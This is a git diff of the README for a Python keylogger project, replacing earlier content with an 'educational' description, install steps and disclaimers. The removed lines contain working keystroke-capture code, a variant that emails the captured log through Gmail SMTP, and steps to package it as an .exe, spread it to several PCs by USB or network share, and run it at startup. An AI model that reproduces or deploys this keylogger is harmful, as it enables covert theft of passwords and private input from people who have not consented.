@@ -1,83 +1,64 @@
-<!--# KEYLOG
-# CODE 1
+🔑 #Keylogging – Capture & Analyze Keystrokes
+
+A lightweight Python-based keylogger designed for educational purposes, showcasing how keystroke capture works under the hood.
+This project demonstrates system input monitoring, event handling, and secure logging techniques — perfect for students, researchers, and cybersecurity enthusiasts.
+
+⚠️ #Disclaimer: This project is intended only for ethical & educational use. Do not use it for malicious purposes. The author is not responsible for any misuse.
+
+✨ Features
+
+🎹 Keystroke Capture – Logs every key pressed in real-time.
+
+📄 Log File Creation – Saves captured data into structured log files.
+
+⏳ Time Stamps – Every keystroke is logged with exact timing.
+
+🖥️ Lightweight & Simple – Minimal dependencies, runs anywhere Python does.
+
+🔐 Educational Focus – Learn about event listeners and system hooks.
 
 
-from pynput import keyboard
+⚙️ Installation
+# Clone the repo
+git clone https://github.com/Ahmer-kun/keylogging.git
+cd keylogging
 
-log_file = "keystrokes.txt"
+# Install dependencies
+pip install -r requirements.txt
 
-def on_press(key):
-    try:
-        with open(log_file, "a") as file:
-            file.write(f"{key.char}")  # Logs characters
-    except AttributeError:
-        with open(log_file, "a") as file:
-            file.write(f" {key} ")  # Logs special keys
+# Run the keylogger
+python keylogger.py
 
-# Start listening to the keyboard
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+📂 Project Structure
+📦 keylogging
+ ┣ 📜 keylogger.py     # Main script
+ ┣ 📜 requirements.txt # Dependencies
+ ┗ 📜 README.md        # Documentation
 
+🚀 Example Output
+[2025-09-18 09:22:11] Key Pressed: H
+[2025-09-18 09:22:12] Key Pressed: e
+[2025-09-18 09:22:12] Key Pressed: l
+[2025-09-18 09:22:13] Key Pressed: l
+[2025-09-18 09:22:13] Key Pressed: o
 
+🔮 Roadmap
 
-# <!--Step on how to use--!>
-Run this in a controlled lab environment.
-Analyze the logs and understand how keyloggers store data.
-Study detection methods like behavioral analysis, process monitoring, and anti-keylogging software.
+ Add GUI interface for easier monitoring
 
+ Enable remote logging (with encryption)
 
+ Improve log analysis & visualization
 
-# CODE 2
+🛡️ Disclaimer
 
-import smtplib
-from email.message import EmailMessage
-from pynput import keyboard
+This project is strictly for learning purposes.
+Using this software to monitor another person’s device without consent may be illegal.
 
-LOG_FILE = "keystrokes.txt"
-EMAIL_ADDRESS = "your_email@gmail.com"
-EMAIL_PASSWORD = "your_password"  # Use App Passwords for security!
+🤝 Contributing
 
-def send_email():
-    with open(LOG_FILE, "r") as file:
-        data = file.read()
+Contributions are welcome! Feel free to fork this repo and submit a pull request with improvements.
 
-    msg = EmailMessage()
-    msg.set_content(data)
-    msg["Subject"] = "Keystroke Logs"
-    msg["From"] = EMAIL_ADDRESS
-    msg["To"] = EMAIL_ADDRESS  # Send to yourself or another test email
+⭐ Support
 
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
-        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-        server.send_message(msg)
-
-def on_press(key):
-    try:
-        with open(LOG_FILE, "a") as file:
-            file.write(f"{key.char}")
-    except AttributeError:
-        with open(LOG_FILE, "a") as file:
-            file.write(f" {key} ")
-
-# Automatically send logs every few minutes
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
-    send_email()
-
-
-
-
-
-
-# Step 2:
-After the code we can use this step
-
-# Deploying on Multiple PCs (For Research)
-# Convert the script into an executable (.exe) using pyinstaller:
-
-pyinstaller --onefile keylogger.py
-
-# Store it on a USB drive or deploy via network sharing.
-# Use task scheduling (Windows Task Scheduler, crontab) to run it at startup.-->
-
-
+If you like this project, don’t forget to star ⭐ the repo!
